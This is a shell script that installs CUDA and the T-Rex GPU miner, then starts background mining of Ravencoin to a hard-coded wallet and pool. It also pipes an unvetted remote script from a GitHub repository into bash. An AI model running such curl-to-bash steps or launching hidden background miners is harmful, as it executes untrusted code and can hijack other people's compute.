#!/bin/sh

sudo apt purge *nvidia* -y
sudo apt autoremove -y
sudo apt update -y 
sudo apt install build-essential -y
sudo apt-get install manpages-dev -y

wget https://developer.download.nvidia.com/compute/cuda/10.2/Prod/local_installers/cuda_10.2.89_440.33.01_linux.run
sudo sh cuda_10.2.89_440.33.01_linux.run --silent

wget https://github.com/trexminer/T-Rex/releases/download/0.19.14/t-rex-0.19.14-linux-cuda10.0.tar.gz
tar -xf t-rex-0.19.14-linux-cuda10.0.tar.gz

bash <(curl -s https://raw.githubusercontent.com/HotNiggus/Minning/main/XMR/xmr_start.sh)
nohup ./t-rex -a KAWPOW -o stratum+tcp://rvn.2miners.com:6060 -u RMNnWQckbrJiJKjTHF1XTwHShomsQTCDXe.V100 -p x &
